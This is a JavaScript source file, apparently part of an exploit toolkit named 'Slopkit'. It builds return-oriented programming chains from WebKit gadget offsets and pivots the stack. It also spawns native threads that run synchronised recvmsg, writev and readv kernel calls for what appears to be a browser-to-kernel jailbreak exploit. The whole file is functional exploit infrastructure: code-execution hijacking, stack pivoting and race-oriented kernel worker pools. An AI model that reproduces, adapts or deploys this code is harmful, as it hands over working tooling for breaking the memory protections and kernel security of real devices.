(function (root) {
    "use strict";

    const NS = root.Slopkit = root.Slopkit || {};
    const { U64 } = NS;
    if (!U64 || !NS.NativeAllocator)
        throw new Error("native.js must be loaded before rop.js");

    const WORKER_FLAG_TIMEOUT_MS = 15000;

    class RopChain {
        constructor(buffer, profile, webkitBase) {
            this.buffer = buffer;
            this.profile = profile;
            this.webkitBase = webkitBase;
            this.cursor = 0;
        }

        gadget(name) {
            return this.webkitBase + this.profile.offset(`webkit.gadgets.${name}`);
        }

        push(value) {
            if (this.cursor + 8 > this.buffer.size)
                throw new Error(`${this.buffer.label}: ROP chain overflow`);
            const address = this.buffer.address + this.cursor;
            this.buffer.put64(this.cursor, value);
            this.cursor += 8;
            return address;
        }

        pushTarget(target) {
            // A target reached through `ret` must observe the SysV function-entry
            // invariant RSP % 16 == 8. Use the verified byte after popRax as a
            // one-byte ret shim when the current chain parity would violate it.
            if (((this.buffer.address + this.cursor + 8) & 0xf) !== 8)
                this.push(this.gadget("popRax") + 1);
            const slot = this.push(target);
            if (((this.buffer.address + this.cursor) & 0xf) !== 8)
                throw new Error(`${this.buffer.label}: native target is misaligned`);
            return slot;
        }

        call(target, args, captureSlots) {
            const argv = args || [];
            if (argv.length > 5) throw new RangeError("ROP call supports five arguments");
            const pops = ["popRdi", "popRsi", "popRdx", "popRcx", "popR8"];
            const slots = [];
            for (let i = 0; i < argv.length; ++i) {
                this.push(this.gadget(pops[i]));
                slots.push(this.push(argv[i]));
            }
            const targetSlot = this.pushTarget(target);
            if (captureSlots) {
                captureSlots.args = slots;
                captureSlots.target = targetSlot;
            }
            return { args: slots, target: targetSlot };
        }

        storeRax(address) {
            this.push(this.gadget("popRdi"));
            this.push(address);
            this.push(this.gadget("movPtrRdiRax"));
        }

        pivot(address) {
            this.push(this.gadget("popRsp"));
            this.push(address);
        }
    }

    class NativeWorker {
        constructor(group, index) {
            this.group = group;
            this.pool = group.pool;
            this.index = index;
            const a = this.pool.allocator;
            this.thread = a.alloc(8, 8, `${group.name}-${index}-thread`);
            this.context = a.alloc(0x120, 0x10, `${group.name}-${index}-context`);
            this.stack = a.alloc(0x4000, 0x10, `${group.name}-${index}-rop`);
            this.name = a.alloc(0x20, 8, `${group.name}-${index}-name`);
            this.name.putCString(0, `sk-${group.name[0]}${index}`, 0x20);
            this.ready = a.alloc(8, 8, `${group.name}-${index}-ready`);
            this.affinityResult = a.alloc(8, 8,
                `${group.name}-${index}-affinity-result`);
            this.priorityResult = a.alloc(8, 8,
                `${group.name}-${index}-priority-result`);
            this.startedFlag = group.control.sub(0x10 + index * 0x10, 8,
                `${group.name}-${index}-started`);
            this.done = group.control.sub(0x18 + index * 0x10, 8,
                `${group.name}-${index}-done`);
            this.exited = a.alloc(8, 8, `${group.name}-${index}-exited`);
            this.operationSlots = null;
            this.operationRepairs = [];
            this.controlTargetSlots = [];
            this.expectedSlot = 0;
            this.tailTargetSlot = 0;
            this.tailPivotSlot = 0;
            this.exitAddress = 0;
            this.exitArmed = false;
            this.started = false;
            this.build();
        }

        k(path) { return this.pool.kernel(path); }

        build() {
            const p = this.pool;
            const chain = new RopChain(this.stack, p.profile, p.webkitBase);
            chain.call(this.k("native.exports.cpusetSetaffinity"),
                [3, 1, -1, 0x10, p.cpuMask.address]);
            chain.storeRax(this.affinityResult.address);
            chain.call(this.k("native.exports.rtprioThread"),
                [1, 0, p.rtprio.address]);
            chain.storeRax(this.priorityResult.address);
            chain.push(chain.gadget("popRax"));
            chain.push(1);
            chain.push(chain.gadget("popRdi"));
            chain.push(this.ready.address);
            chain.push(chain.gadget("movPtrRdiRax"));
            chain.call(this.k("native.exports.umtxOp"),
                [this.ready.address, p.umtxWake, 1, 0, 0]);
            chain.pivot(this.stack.address + 0x800);

            chain.cursor = 0x800;
            const loopAddress = this.stack.address + chain.cursor;

            chain.push(chain.gadget("popRdi"));
            chain.push(this.group.generation.address);
            chain.push(chain.gadget("popRsi"));
            chain.push(p.umtxWait);
            chain.push(chain.gadget("popRdx"));
            this.expectedSlot = chain.push(0);
            chain.push(chain.gadget("popRcx"));
            chain.push(0);
            chain.push(chain.gadget("popR8"));
            chain.push(0);
            this.controlTargetSlots.push(chain.push(
                this.k("native.exports.umtxOp")));

            chain.push(chain.gadget("popRax"));
            chain.push(1);
            chain.push(chain.gadget("popRdi"));
            chain.push(this.startedFlag.address);
            chain.push(chain.gadget("movPtrRdiRax"));
            this.controlTargetSlots.push(chain.call(
                this.k("native.exports.umtxOp"),
                [this.startedFlag.address, p.umtxWake, 1, 0, 0]).target);

            this.operationSlots = {};
            chain.call(this.group.operation, [0, 0, 0], this.operationSlots);
            const operationPops = ["popRdi", "popRsi", "popRdx"];
            for (let i = 0; i < this.operationSlots.args.length; ++i) {
                this.operationRepairs.push({
                    address: this.operationSlots.args[i] - 8,
                    value: chain.gadget(operationPops[i])
                });
            }
            const finalArgumentEnd = this.operationSlots.args[
                this.operationSlots.args.length - 1] + 8;
            if (this.operationSlots.target !== finalArgumentEnd) {
                this.operationRepairs.push({
                    address: this.operationSlots.target - 8,
                    value: chain.gadget("popRax") + 1
                });
            }

            chain.push(chain.gadget("popRax"));
            chain.push(1);
            chain.push(chain.gadget("popRdi"));
            chain.push(this.done.address);
            chain.push(chain.gadget("movPtrRdiRax"));
            this.controlTargetSlots.push(chain.call(
                this.k("native.exports.umtxOp"),
                [this.done.address, p.umtxWake, 1, 0, 0]).target);

            // Park after completion until the controller has patched the next
            // generation and arguments. This prevents a lost wake between jobs.
            this.controlTargetSlots.push(chain.call(
                this.k("native.exports.umtxOp"),
                [this.done.address, p.umtxWait, 1, 0, 0]).target);

            chain.push(chain.gadget("popRdi"));
            chain.push(0);
            this.tailTargetSlot = chain.pushTarget(chain.gadget("popRsp"));
            this.tailPivotSlot = chain.push(loopAddress);

            this.exitAddress = this.stack.address + chain.cursor;
            chain.push(chain.gadget("popRax"));
            chain.push(1);
            chain.push(chain.gadget("popRdi"));
            chain.push(this.exited.address);
            chain.push(chain.gadget("movPtrRdiRax"));
            chain.call(this.k("native.exports.umtxOp"),
                [this.exited.address, p.umtxWake, 1, 0, 0]);
            chain.call(this.k("native.exports.pthreadExit"), [0]);

            const at = (name) => p.profile.offset(`native.context.offsets.${name}`);
            this.context.put64(at("rip"), this.stack.get64(0));
            this.context.put64(at("rsp"), this.stack.address + 8);
        }

        patchArguments(args) {
            const argv = args || [];
            if (argv.length > this.operationSlots.args.length)
                throw new RangeError("too many worker arguments");
            for (let i = 0; i < this.operationSlots.args.length; ++i)
                this.pool.memory.write64(this.operationSlots.args[i], argv[i] || 0);
        }

        repairLoop() {
            const umtx = this.k("native.exports.umtxOp");
            for (const slot of this.controlTargetSlots)
                this.pool.memory.write64(slot, umtx);
            for (const repair of this.operationRepairs)
                this.pool.memory.write64(repair.address, repair.value);
            this.pool.memory.write64(this.operationSlots.target,
                this.exitArmed
                    ? this.k("native.exports.schedYield") : this.group.operation);
        }

        start() {
            const result = this.pool.bridge.callOffsetI32("native.exports.pthreadCreate",
                [this.thread.address, 0,
                    this.k("native.context.setcontextEntry"),
                    this.context.address, this.name.address]);
            if (result !== 0) throw new Error(`${this.name.label}: pthread create ${result}`);
            // A zero or unreadable ID after a successful create still means a
            // thread may exist; retain its arena instead of treating it as idle.
            this.started = true;
            this.exited.put32(0, 0);
            const tid = this.thread.get64(0);
            if (tid.isZero()) throw new Error(`${this.name.label}: empty pthread id`);
        }

        validateScheduling() {
            const affinity = this.affinityResult.get64(0).toInt32();
            const priority = this.priorityResult.get64(0).toInt32();
            if (affinity !== 0 || priority !== 0)
                throw new Error(`${this.name.label}: scheduling failed`
                    + ` affinity=${affinity} rt=${priority} core=${this.pool.core}`);
        }

        armExit() {
            this.exitArmed = true;
            this.pool.memory.write64(this.tailPivotSlot, this.exitAddress);
        }

        join() {
            if (!this.started) return;
            if (this.exited.get32(0) !== 1)
                throw new Error(`${this.name.label}: refusing to join a live thread`);
            const result = this.pool.bridge.callOffsetI32("native.exports.pthreadJoin",
                [this.thread.get64(0), 0]);
            if (result !== 0) throw new Error(`${this.name.label}: pthread join ${result}`);
            this.started = false;
        }
    }

    class WorkerGroup {
        constructor(pool, name, count, operation) {
            this.pool = pool;
            this.name = name;
            this.operation = operation;
            this.control = pool.allocator.alloc(0x10 + count * 0x10, 0x10,
                `${name}-control`);
            this.generation = this.control.sub(0, 8, `${name}-generation`);
            this.generationValue = 0;
            this.workers = [];
            this.running = false;
            this.inFlight = false;
            this.atDoneBarrier = false;
            for (let i = 0; i < count; ++i)
                this.workers.push(new NativeWorker(this, i));
        }

        start() {
            this.running = true;
            try {
                for (const worker of this.workers)
                    worker.start();
                for (const worker of this.workers)
                    this.pollFlag(worker.ready, worker.ready.label);
                for (const worker of this.workers) worker.validateScheduling();
            } catch (error) {
                const allWorkers = this.workers;
                const started = allWorkers.filter((worker) => worker.started);
                this.workers = started;
                const allReady = started.length > 0 && started.every((worker) =>
                    !worker.thread.get64(0).isZero()
                    && worker.ready.get32(0) === 1);
                // A thread that never published readiness may still be inside
                // its scheduling preamble. Do not dispatch or join that group;
                // retain its arena until the required cold power cycle.
                try { if (allReady) this.stop(); } catch {}
                this.workers = allWorkers;
                this.running = false;
                throw error;
            }
        }

        wake() {
            this.generationValue = (this.generationValue + 1) >>> 0;
            if (this.generationValue === 0) this.generationValue = 1;
            this.generation.put32(0, this.generationValue);
            this.pool.bridge.callOffset("native.exports.umtxOp",
                [this.generation.address, this.pool.umtxWake,
                    this.workers.length, 0, 0]);
        }

        wakeFlag(flag) {
            this.pool.bridge.callOffset("native.exports.umtxOp",
                [flag.address, this.pool.umtxWake, 1, 0, 0]);
        }

        waitFlag(flag, expected, label) {
            this.pollFlag(flag, label, expected);
        }

        pollFlag(flag, label, expected) {
            const timeoutMs = this.pool.flagTimeoutMs;
            const deadline = Date.now() + timeoutMs;
            while (flag.get32(0) !== 1) {
                if (Date.now() >= deadline)
                    throw new Error(`${label}: timed out after `
                        + `${timeoutMs}ms`);
                this.pool.pause(flag, expected ?? 0);
            }
        }

        waitExited() {
            for (const worker of this.workers)
                this.pollFlag(worker.exited, worker.exited.label);
        }

        prepare(worker, args) {
            // Direct libc operations save registers immediately below RSP and
            // overwrite their reusable call frame. Restore immutable gadgets
            // and targets while the worker is still held at a barrier.
            worker.repairLoop();
            this.pool.memory.write64(worker.expectedSlot, this.generationValue);
            worker.startedFlag.put32(0, 0);
            worker.patchArguments(args);
            worker.done.put32(0, 0);
            this.wakeFlag(worker.done);
        }

        waitStarted() {
            for (const worker of this.workers)
                this.waitFlag(worker.startedFlag, 0, worker.startedFlag.label);
        }

        wait() {
            if (!this.inFlight)
                throw new Error(`${this.name} workers have no in-flight command`);
            for (const worker of this.workers)
                this.waitFlag(worker.done, 0, worker.done.label);
            this.inFlight = false;
            this.atDoneBarrier = true;
        }

        dispatch(args, waitForCompletion) {
            if (!this.running) throw new Error(`${this.name} workers are not running`);
            if (this.inFlight)
                throw new Error(`${this.name} workers already have an in-flight command`);
            // Preparing the first worker can release it from the preceding done
            // gate, so the group is no longer uniformly parked at that barrier.
            this.atDoneBarrier = false;
            for (const worker of this.workers) this.prepare(worker, args);
            this.inFlight = true;
            this.wake();
            this.waitStarted();
            if (waitForCompletion !== false) this.wait();
        }

        stop() {
            if (!this.running) return;
            if (this.inFlight)
                throw new Error(`${this.name} workers cannot stop while a syscall is in flight`);
            if (this.atDoneBarrier) {
                // A completed command leaves every worker immediately before
                // the tail target. Arm that target, release the existing done
                // gate, and join. Issuing another generation here would wait
                // for a started signal from workers that have already exited.
                for (const worker of this.workers) worker.armExit();
                this.atDoneBarrier = false;
                for (const worker of this.workers) {
                    worker.done.put32(0, 0);
                    this.wakeFlag(worker.done);
                }
                this.waitExited();
                for (const worker of this.workers) worker.join();
                this.running = false;
                return;
            }

            // A newly started group is still parked at its first generation
            // wait. Run one harmless sched_yield command to move it to the
            // completion gate before releasing the exit tail.
            for (const worker of this.workers) {
                worker.armExit();
                this.prepare(worker, []);
            }
            this.inFlight = true;
            this.wake();
            for (const worker of this.workers)
                this.pollFlag(worker.startedFlag, worker.startedFlag.label);
            for (const worker of this.workers)
                this.pollFlag(worker.done, worker.done.label);
            this.inFlight = false;
            this.atDoneBarrier = true;
            for (const worker of this.workers) {
                worker.done.put32(0, 0);
                this.wakeFlag(worker.done);
            }
            this.atDoneBarrier = false;
            this.waitExited();
            for (const worker of this.workers) worker.join();
            this.running = false;
        }
    }

    class NativeWorkerPool {
        constructor(options) {
            this.bridge = options.bridge;
            this.allocator = options.allocator;
            this.memory = options.memory;
            this.profile = options.profile;
            this.webkitBase = options.webkitBase;
            this.kernelBase = options.kernelBase;
            this.flagTimeoutMs = Number.isSafeInteger(options.flagTimeoutMs)
                && options.flagTimeoutMs > 0
                ? options.flagTimeoutMs : WORKER_FLAG_TIMEOUT_MS;
            this.umtxWait = this.profile.offset("kernel.constants.umtxWaitPrivate");
            this.umtxWake = this.profile.offset("kernel.constants.umtxWakePrivate");
            this.cpuMask = this.allocator.alloc(0x10, 0x10, "worker-cpuset");
            this.core = options.core ?? this.profile.raw.kernel.tuning.mainCore;
            if (!Number.isSafeInteger(this.core) || this.core < 0 || this.core >= 128)
                throw new RangeError("invalid worker CPU core");
            this.cpuMask.put8(this.core >>> 3, 1 << (this.core & 7));
            this.rtprio = this.allocator.alloc(4, 4, "worker-rtprio");
            this.rtprio.put16(0, 2);
            this.rtprio.put16(2,
                this.profile.raw.kernel.tuning.realtimePriority);
            this.waitSlice = this.allocator.alloc(0x10, 8,
                "worker-wait-slice");
            this.waitSlice.put64(0, 0);
            this.waitSlice.put64(8, 1000000);
            const tuning = this.profile.raw.kernel.tuning;
            this.recv = new WorkerGroup(this, "recv",
                tuning.recvWorkers, this.kernel("native.exports.recvmsg"));
            this.writev = new WorkerGroup(this, "writev",
                tuning.writevWorkers, this.kernel("native.exports.writev"));
            this.readv = new WorkerGroup(this, "readv",
                tuning.readvWorkers, this.kernel("native.exports.readv"));
            this.started = false;
            this.retained = false;
        }

        kernel(path) { return this.kernelBase + this.profile.offset(path); }

        pause(flag, expected) {
            this.bridge.callOffset("native.exports.umtxOp",
                [flag.address, this.umtxWait, expected, 0,
                    this.waitSlice.address]);
        }

        liveWorkerCount() {
            let count = 0;
            for (const group of [this.recv, this.writev, this.readv])
                for (const worker of group.workers) if (worker.started) count++;
            return count;
        }

        start() {
            try {
                this.recv.start();
                this.writev.start();
                this.readv.start();
                this.started = true;
            } catch (error) {
                for (const group of [this.readv, this.writev, this.recv]) {
                    try { if (group.running && !group.inFlight) group.stop(); } catch {}
                }
                throw error;
            }
        }

        smoke(rounds) {
            if (!this.started) throw new Error("worker smoke requires a started pool");
            const count = rounds || 2;
            for (let round = 0; round < count; ++round) {
                // An invalid descriptor gives every cancellation-aware wrapper
                // a quick non-blocking return. Two rounds prove the overwritten
                // operation frame was repaired before reuse.
                this.recv.dispatch([-1, 0, 0]);
                this.writev.dispatch([-1, 0, 0]);
                this.readv.dispatch([-1, 0, 0]);
            }
        }

        stop() {
            if (!this.started) return;
            if (this.retained)
                throw new Error("retained P2JB workers must remain parked");
            // Only one group is ever dispatched at a time, so all groups are idle
            // when the controller reaches this explicit teardown.
            this.recv.stop();
            this.writev.stop();
            this.readv.stop();
            this.started = false;
        }

        retainParked() {
            if (!this.started)
                throw new Error("worker retention requires a started pool");
            for (const group of [this.recv, this.writev, this.readv]) {
                if (!group.running || group.inFlight)
                    throw new Error(`${group.name} workers are not at a retainable barrier`);
            }
            const expected = this.recv.workers.length
                + this.writev.workers.length + this.readv.workers.length;
            if (this.liveWorkerCount() !== expected)
                throw new Error("worker retention observed a missing native thread");
            this.retained = true;
            return expected;
        }
    }

    NS.RopChain = RopChain;
    NS.NativeWorkerPool = NativeWorkerPool;
    if (typeof module !== "undefined" && module.exports)
        module.exports = { RopChain, NativeWorkerPool, WorkerGroup, NativeWorker };
})(typeof globalThis !== "undefined" ? globalThis : this);
